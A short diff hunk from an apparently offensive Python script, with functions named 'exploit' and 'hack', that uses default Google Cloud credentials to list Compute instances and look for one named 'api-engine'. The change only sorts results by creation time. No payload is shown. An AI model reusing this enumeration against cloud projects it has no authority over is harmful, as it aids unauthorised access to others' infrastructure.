@@ -75,7 +75,7 @@ def exploit(nonce):
 def hack():
     credentials, project_id = google.auth.default()
     compute_api = discovery.build('compute', 'v1', credentials=credentials)
-    response = compute_api.instances().list(project=project_id, zone='us-west1-b').execute()
+    response = compute_api.instances().list(project=project_id, zone='us-west1-b', orderBy="creationTimestamp desc").execute()
 
     for instance in response['items']:
         if instance['name'] == 'api-engine':            
